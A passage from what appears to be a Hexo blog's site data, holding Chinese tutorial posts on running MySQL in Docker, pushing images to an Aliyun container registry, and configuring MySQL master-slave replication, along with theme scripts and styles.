</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>-d 后台运行</p>\n</li>\n<li><p>-p 端口映射，将本机的3306，映射为容器的3306端口，需要注意的是，如果本机已经装了MySQL，本机3306端口已经被占用的话，需要改变监听的端口。</p>\n</li>\n<li><p>-v &#x2F;docker&#x2F;mysql&#x2F;log:&#x2F;var&#x2F;log&#x2F;mysql 数据库服务的日志目录映射</p>\n</li>\n<li><p>-v &#x2F;docker&#x2F;mysql&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql 数据库服务的数据库数据映射</p>\n</li>\n<li><p>-v &#x2F;docker&#x2F;mysql&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d 数据库服务的配置文件映射</p>\n</li>\n<li><p>-e 指定数据库服务的密码</p>\n</li>\n<li><p>–name 指定容器名称</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li>验证生成</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>进入容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it mysql-1 /bin/bash</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>进入数据库</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -padmin</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>-p 输入生成容器时设置的密码，-p和密码之间不能有空格</li>\n</ul>"},{"title":"Docker镜像推送到阿里云","date":"2023-08-09T13:40:49.000Z","_content":"\n在自己本地生产需要的Docker镜像，只留在本地只能供自己使用，而在团队协作的过程中，更多的要发挥文件共享的优势，那么就需要把Docker镜像推送到远端仓库，作为一个共享的资源。Docker Hub 确实是一个不错的工具，但是作为国内用户来讲，不是很友好，那么在阿里云迅猛发展的今天，也给我们提供了不错的解决方案。所以，最后决定把阿里云仓库作为docker镜像的选择。\n\n### 操作步骤\n\n1. 需要拥有一个阿里云旗下的一个账号，支付宝，淘宝等等都可以。浏览器搜索`aliyun.com`。\n\n<!-- more -->\n\n2. 登录完成后，进入容器镜像服务。\n\n![登录](./DockerPushAliyun/1.png)\n\n3. 实例列表选择个人版，进入后创建命名空间。\n\n![登录](./DockerPushAliyun/2.png)\n\n4. 然后创建镜像仓库。\n\n![登录](./DockerPushAliyun/3.png)\n\n5. 创建完成后，点击镜像仓库右侧的管理。\n\n![登录](./DockerPushAliyun/4.png)\n\n6. 这里面是可能会用到的命令。\n\n![登录](./DockerPushAliyun/5.png)\n\n7. 附上自己的仓库，纯粹为了方便自己。\n\n* 登录阿里云Docker Registry：\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n* 从Registry中拉取镜像:\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```\n\n* 将镜像推送到Registry:\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n```bash\ndocker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```\n \n```bash\ndocker push registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```","source":"_posts/DockerPushAliyun.md","raw":"---\ntitle: Docker镜像推送到阿里云\ndate: 2023-08-09 21:40:49\ncategories: 学习过程\ntags:\n  - Docker\n---\n\n在自己本地生产需要的Docker镜像，只留在本地只能供自己使用，而在团队协作的过程中，更多的要发挥文件共享的优势，那么就需要把Docker镜像推送到远端仓库，作为一个共享的资源。Docker Hub 确实是一个不错的工具，但是作为国内用户来讲，不是很友好，那么在阿里云迅猛发展的今天，也给我们提供了不错的解决方案。所以，最后决定把阿里云仓库作为docker镜像的选择。\n\n### 操作步骤\n\n1. 需要拥有一个阿里云旗下的一个账号，支付宝，淘宝等等都可以。浏览器搜索`aliyun.com`。\n\n<!-- more -->\n\n2. 登录完成后，进入容器镜像服务。\n\n![登录](./DockerPushAliyun/1.png)\n\n3. 实例列表选择个人版，进入后创建命名空间。\n\n![登录](./DockerPushAliyun/2.png)\n\n4. 然后创建镜像仓库。\n\n![登录](./DockerPushAliyun/3.png)\n\n5. 创建完成后，点击镜像仓库右侧的管理。\n\n![登录](./DockerPushAliyun/4.png)\n\n6. 这里面是可能会用到的命令。\n\n![登录](./DockerPushAliyun/5.png)\n\n7. 附上自己的仓库，纯粹为了方便自己。\n\n* 登录阿里云Docker Registry：\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n* 从Registry中拉取镜像:\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```\n\n* 将镜像推送到Registry:\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n```bash\ndocker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```\n \n```bash\ndocker push registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```","slug":"DockerPushAliyun","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5dq001n7zj3fjcd85ab","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>在自己本地生产需要的Docker镜像，只留在本地只能供自己使用，而在团队协作的过程中，更多的要发挥文件共享的优势，那么就需要把Docker镜像推送到远端仓库，作为一个共享的资源。Docker Hub 确实是一个不错的工具，但是作为国内用户来讲，不是很友好，那么在阿里云迅猛发展的今天，也给我们提供了不错的解决方案。所以，最后决定把阿里云仓库作为docker镜像的选择。</p>\n<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>需要拥有一个阿里云旗下的一个账号，支付宝，淘宝等等都可以。浏览器搜索<code>aliyun.com</code>。</li>\n</ol>\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>登录完成后，进入容器镜像服务。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/1.png\" alt=\"登录\"></p>\n<ol start=\"3\">\n<li>实例列表选择个人版，进入后创建命名空间。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/2.png\" alt=\"登录\"></p>\n<ol start=\"4\">\n<li>然后创建镜像仓库。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/3.png\" alt=\"登录\"></p>\n<ol start=\"5\">\n<li>创建完成后，点击镜像仓库右侧的管理。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/4.png\" alt=\"登录\"></p>\n<ol start=\"6\">\n<li>这里面是可能会用到的命令。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/5.png\" alt=\"登录\"></p>\n<ol start=\"7\">\n<li>附上自己的仓库，纯粹为了方便自己。</li>\n</ol>\n<ul>\n<li>登录阿里云Docker Registry：</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login --username=knight731 registry.cn-hangzhou.aliyuncs.com</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>从Registry中拉取镜像:</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>将镜像推送到Registry:</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login --username=knight731 registry.cn-hangzhou.aliyuncs.com</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker push registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>在自己本地生产需要的Docker镜像，只留在本地只能供自己使用，而在团队协作的过程中，更多的要发挥文件共享的优势，那么就需要把Docker镜像推送到远端仓库，作为一个共享的资源。Docker Hub 确实是一个不错的工具，但是作为国内用户来讲，不是很友好，那么在阿里云迅猛发展的今天，也给我们提供了不错的解决方案。所以，最后决定把阿里云仓库作为docker镜像的选择。</p>\n<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>需要拥有一个阿里云旗下的一个账号，支付宝，淘宝等等都可以。浏览器搜索<code>aliyun.com</code>。</li>\n</ol>","more":"<ol start=\"2\">\n<li>登录完成后，进入容器镜像服务。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/1.png\" alt=\"登录\"></p>\n<ol start=\"3\">\n<li>实例列表选择个人版，进入后创建命名空间。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/2.png\" alt=\"登录\"></p>\n<ol start=\"4\">\n<li>然后创建镜像仓库。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/3.png\" alt=\"登录\"></p>\n<ol start=\"5\">\n<li>创建完成后，点击镜像仓库右侧的管理。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/4.png\" alt=\"登录\"></p>\n<ol start=\"6\">\n<li>这里面是可能会用到的命令。</li>\n</ol>\n<p><img src=\"/2023/08/09/DockerPushAliyun/5.png\" alt=\"登录\"></p>\n<ol start=\"7\">\n<li>附上自己的仓库，纯粹为了方便自己。</li>\n</ol>\n<ul>\n<li>登录阿里云Docker Registry：</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login --username=knight731 registry.cn-hangzhou.aliyuncs.com</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>从Registry中拉取镜像:</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>将镜像推送到Registry:</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login --username=knight731 registry.cn-hangzhou.aliyuncs.com</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker push registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]</span><br></pre></td></tr></table></figure>"},{"title":"Docker实现MySQL主从复制","date":"2023-08-12T11:57:57.000Z","_content":"\n### 操作步骤\n\n1. 下载镜像\n\n```bash\ndocker pull mysql:5.7\n```\n\n目前我测试最新的8.0.27是不能测试成功的，不知道原因出在哪里，保守一点使用5.7的版本。\n\n<!-- more -->\n\n实现效果：\n\n```bash\nroot@knight:/docker# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED         SIZE\nmysql        latest    3218b38490ce   19 months ago   516MB\n```\n\n2. 生成主数据库容器\n\n```bash\ndocker run -d -p 3307:3306 \\\n--privileged=true \\\n-v /docker/mysql-master/log:/var/log/mysql \\\n-v /docker/mysql-master/data:/var/lib/mysql \\\n-v /docker/mysql-master/conf:/etc/mysql/conf.d \\\n-e MYSQL_ROOT_PASSWORD=admin \\\n--name mysql-master \\\nmysql:latest\n```\n\n具体的参数详解，可以查看[这篇文章](https://nustarain.gitee.io/2023/08/10/DockerMySQL/#more)\n\n实现效果：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                                                  NAMES\na1f6f6e03029   mysql:latest   \"docker-entrypoint.s…\"   6 seconds ago   Up 5 seconds   33060/tcp, 0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   mysql-master\n```\n\n3. 添加配置文件\n\n进入`/docker/mysql-master/conf`目录，编辑配置文件`my.cnf`，插入以下内容：\n\n```bash 折叠代码\n[mysqld]\n## 设置server_id，同一局域网中需要唯一\nserver_id=101 \n## 指定不需要同步的数据库名称\nbinlog-ignore-db=mysql  \n## 开启二进制日志功能\nlog-bin=com-mysql-bin  \n## 设置二进制日志使用内存大小（事务）\nbinlog_cache_size=1M  \n## 设置使用的二进制日志格式（mixed,statement,row）\nbinlog_format=mixed  \n## 二进制日志过期清理时间。默认值为0，表示不自动清理。\nexpire_logs_days=7  \n## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。\n## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致\nslave_skip_errors=1062\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-master\n```\n\n5. 进入容器\n\n```bash\ndocker exec -it mysql-master /bin/bash\n```\n\n6. 授权用户\n\n进入数据库，添加授权用户。\n\n```sql\nCREATE USER 'slave'@'%' IDENTIFIED BY '123456';\nGRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';\n```\n\n实现效果：\n\n```sql\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> CREATE USER 'slave'@'%' IDENTIFIED BY '123456';\nQuery OK, 0 rows affected (0.03 sec)\n\nmysql> GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';\nQuery OK, 0 rows affected (0.02 sec)\n```\n\n7. 查看主数据库的主状态\n\n```sql\nmysql> show master status;\n+----------------------+----------+--------------+------------------+-------------------+\n| File                 | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |\n+----------------------+----------+--------------+------------------+-------------------+\n| com-mysql-bin.000001 |      156 |              | mysql            |                   |\n+----------------------+----------+--------------+------------------+-------------------+\n1 row in set (0.00 sec)\n```\n\n8. 创建从数据库容器\n\n```bash\ndocker run -d -p 3308:3306 \\\n--privileged=true \\\n-v /docker/mysql-slave/log:/var/log/mysql \\\n-v /docker/mysql-slave/data:/var/lib/mysql \\\n-v /docker/mysql-slave/conf:/etc/mysql/conf.d \\\n-e MYSQL_ROOT_PASSWORD=admin \\\n--name mysql-slave \\\nmysql:latest\n```\n\n9. 实现效果：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED              STATUS              PORTS                                                  NAMES\n06a84db29686   mysql:latest   \"docker-entrypoint.s…\"   3 seconds ago        Up 2 seconds        33060/tcp, 0.0.0.0:3308->3306/tcp, :::3308->3306/tcp   mysql-slave\na1f6f6e03029   mysql:latest   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute   33060/tcp, 0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   mysql-master\n```\n\n10. 添加配置文件\n\n进入`/docker/mysql-slave/conf`目录，编辑配置文件`my.cnf`，插入以下内容：\n\n```bash\n[mysqld]\n## 设置server_id，同一局域网中需要唯一\nserver_id=102\n## 指定不需要同步的数据库名称\nbinlog-ignore-db=mysql  \n## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用\nlog-bin=com-mysql-slave1-bin  \n## 设置二进制日志使用内存大小（事务）\nbinlog_cache_size=1M  \n## 设置使用的二进制日志格式（mixed,statement,row）\nbinlog_format=mixed  \n## 二进制日志过期清理时间。默认值为0，表示不自动清理。\nexpire_logs_days=7  \n## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。\n## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致\nslave_skip_errors=1062  \n## relay_log配置中继日志\nrelay_log=com-mysql-relay-bin  \n## log_slave_updates表示slave将复制事件写进自己的二进制日志\nlog_slave_updates=1  \n## slave设置为只读（具有super权限的用户除外）\nread_only=1\n```\n\n11. 重启容器\n\n```bash\ndocker restart mysql-slave\n```\n\n12. 在从数据库中配置主从复制\n\n进入容器\n\n```bash\ndocker exec -it mysql-slave /bin/bash\n```\n\n进入数据库\n\n```bash\nmysql -u root -padmin\n```\n\n开启复制功能\n\n```sql\nchange master to master_host='192.168.1.42', master_user='slave', master_password='123456', master_port=3307, master_log_file='com-mysql-bin.000001', master_log_pos=156, master_connect_retry=30;\n```\n\n上面的宿主机ip需要根据实际情况修改。\n\n主从复制参数说明：\n\n* master_host：主数据库的IP地址；\n* master_port：主数据库的运行端口；\n* master_user：在主数据库创建的用于同步数据的用户账号；\n* master_password：在主数据库创建的用于同步数据的用户密码；\n* master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数；\n* master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数；\n* master_connect_retry：连接失败重试的时间间隔，单位为秒。\n\n13. 在从数据库中开启主从同步\n\n```sql\nstart slave;\n```\n\n14. 查看从数据库状态\n\n```sql\nshow slave status \\G;\n```\n\n```sql 折叠代码\nmysql> show slave status \\G\n*************************** 1. row ***************************\n               Slave_IO_State: Connecting to source\n                  Master_Host: 192.168.1.42\n                  Master_User: slave\n                  Master_Port: 3307\n                Connect_Retry: 30\n              Master_Log_File: com-mysql-bin.000001\n          Read_Master_Log_Pos: 156\n               Relay_Log_File: com-mysql-relay-bin.000001\n                Relay_Log_Pos: 4\n        Relay_Master_Log_File: com-mysql-bin.000001\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n```\n\n15. 主从复制测试\n\n主库新建库、新建表、插入数据：\n\n```sql\ncreate database db108;\nuse db108;\ncreate table t1 (id int,name varchar(20));\ninsert into t1 values(1,'liuxp');\nselect * from t1;\n```\n\n从库查看库、查看记录，看主从同步是否成功:\n\n```sql\nshow databases;\nuse db108;\nselect * from t1;\n```","source":"_posts/DockerMySQLMasterSlave.md","raw":"---\ntitle: Docker实现MySQL主从复制\ndate: 2023-08-12 19:57:57\ncategories: 技术\ntags:\n  - Docker\n  - MySQL\n---\n\n### 操作步骤\n\n1. 下载镜像\n\n```bash\ndocker pull mysql:5.7\n```\n\n目前我测试最新的8.0.27是不能测试成功的，不知道原因出在哪里，保守一点使用5.7的版本。\n\n<!-- more -->\n\n实现效果：\n\n```bash\nroot@knight:/docker# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED         SIZE\nmysql        latest    3218b38490ce   19 months ago   516MB\n```\n\n2. 生成主数据库容器\n\n```bash\ndocker run -d -p 3307:3306 \\\n--privileged=true \\\n-v /docker/mysql-master/log:/var/log/mysql \\\n-v /docker/mysql-master/data:/var/lib/mysql \\\n-v /docker/mysql-master/conf:/etc/mysql/conf.d \\\n-e MYSQL_ROOT_PASSWORD=admin \\\n--name mysql-master \\\nmysql:latest\n```\n\n具体的参数详解，可以查看[这篇文章](https://nustarain.gitee.io/2023/08/10/DockerMySQL/#more)\n\n实现效果：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                                                  NAMES\na1f6f6e03029   mysql:latest   \"docker-entrypoint.s…\"   6 seconds ago   Up 5 seconds   33060/tcp, 0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   mysql-master\n```\n\n3. 添加配置文件\n\n进入`/docker/mysql-master/conf`目录，编辑配置文件`my.cnf`，插入以下内容：\n\n```bash 折叠代码\n[mysqld]\n## 设置server_id，同一局域网中需要唯一\nserver_id=101 \n## 指定不需要同步的数据库名称\nbinlog-ignore-db=mysql  \n## 开启二进制日志功能\nlog-bin=com-mysql-bin  \n## 设置二进制日志使用内存大小（事务）\nbinlog_cache_size=1M  \n## 设置使用的二进制日志格式（mixed,statement,row）\nbinlog_format=mixed  \n## 二进制日志过期清理时间。默认值为0，表示不自动清理。\nexpire_logs_days=7  \n## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。\n## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致\nslave_skip_errors=1062\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-master\n```\n\n5. 进入容器\n\n```bash\ndocker exec -it mysql-master /bin/bash\n```\n\n6. 授权用户\n\n进入数据库，添加授权用户。\n\n```sql\nCREATE USER 'slave'@'%' IDENTIFIED BY '123456';\nGRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';\n```\n\n实现效果：\n\n```sql\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> CREATE USER 'slave'@'%' IDENTIFIED BY '123456';\nQuery OK, 0 rows affected (0.03 sec)\n\nmysql> GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';\nQuery OK, 0 rows affected (0.02 sec)\n```\n\n7. 查看主数据库的主状态\n\n```sql\nmysql> show master status;\n+----------------------+----------+--------------+------------------+-------------------+\n| File                 | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |\n+----------------------+----------+--------------+------------------+-------------------+\n| com-mysql-bin.000001 |      156 |              | mysql            |                   |\n+----------------------+----------+--------------+------------------+-------------------+\n1 row in set (0.00 sec)\n```\n\n8. 创建从数据库容器\n\n```bash\ndocker run -d -p 3308:3306 \\\n--privileged=true \\\n-v /docker/mysql-slave/log:/var/log/mysql \\\n-v /docker/mysql-slave/data:/var/lib/mysql \\\n-v /docker/mysql-slave/conf:/etc/mysql/conf.d \\\n-e MYSQL_ROOT_PASSWORD=admin \\\n--name mysql-slave \\\nmysql:latest\n```\n\n9. 实现效果：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED              STATUS              PORTS                                                  NAMES\n06a84db29686   mysql:latest   \"docker-entrypoint.s…\"   3 seconds ago        Up 2 seconds        33060/tcp, 0.0.0.0:3308->3306/tcp, :::3308->3306/tcp   mysql-slave\na1f6f6e03029   mysql:latest   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute   33060/tcp, 0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   mysql-master\n```\n\n10. 添加配置文件\n\n进入`/docker/mysql-slave/conf`目录，编辑配置文件`my.cnf`，插入以下内容：\n\n```bash\n[mysqld]\n## 设置server_id，同一局域网中需要唯一\nserver_id=102\n## 指定不需要同步的数据库名称\nbinlog-ignore-db=mysql  \n## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用\nlog-bin=com-mysql-slave1-bin  \n## 设置二进制日志使用内存大小（事务）\nbinlog_cache_size=1M  \n## 设置使用的二进制日志格式（mixed,statement,row）\nbinlog_format=mixed  \n## 二进制日志过期清理时间。默认值为0，表示不自动清理。\nexpire_logs_days=7  \n## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。\n## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致\nslave_skip_errors=1062  \n## relay_log配置中继日志\nrelay_log=com-mysql-relay-bin  \n## log_slave_updates表示slave将复制事件写进自己的二进制日志\nlog_slave_updates=1  \n## slave设置为只读（具有super权限的用户除外）\nread_only=1\n```\n\n11. 重启容器\n\n```bash\ndocker restart mysql-slave\n```\n\n12. 在从数据库中配置主从复制\n\n进入容器\n\n```bash\ndocker exec -it mysql-slave /bin/bash\n```\n\n进入数据库\n\n```bash\nmysql -u root -padmin\n```\n\n开启复制功能\n\n```sql\nchange master to master_host='192.168.1.42', master_user='slave', master_password='123456', master_port=3307, master_log_file='com-mysql-bin.000001', master_log_pos=156, master_connect_retry=30;\n```\n\n上面的宿主机ip需要根据实际情况修改。\n\n主从复制参数说明：\n\n* master_host：主数据库的IP地址；\n* master_port：主数据库的运行端口；\n* master_user：在主数据库创建的用于同步数据的用户账号；\n* master_password：在主数据库创建的用于同步数据的用户密码；\n* master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数；\n* master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数；\n* master_connect_retry：连接失败重试的时间间隔，单位为秒。\n\n13. 在从数据库中开启主从同步\n\n```sql\nstart slave;\n```\n\n14. 查看从数据库状态\n\n```sql\nshow slave status \\G;\n```\n\n```sql 折叠代码\nmysql> show slave status \\G\n*************************** 1. row ***************************\n               Slave_IO_State: Connecting to source\n                  Master_Host: 192.168.1.42\n                  Master_User: slave\n                  Master_Port: 3307\n                Connect_Retry: 30\n              Master_Log_File: com-mysql-bin.000001\n          Read_Master_Log_Pos: 156\n               Relay_Log_File: com-mysql-relay-bin.000001\n                Relay_Log_Pos: 4\n        Relay_Master_Log_File: com-mysql-bin.000001\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n```\n\n15. 主从复制测试\n\n主库新建库、新建表、插入数据：\n\n```sql\ncreate database db108;\nuse db108;\ncreate table t1 (id int,name varchar(20));\ninsert into t1 values(1,'liuxp');\nselect * from t1;\n```\n\n从库查看库、查看记录，看主从同步是否成功:\n\n```sql\nshow databases;\nuse db108;\nselect * from 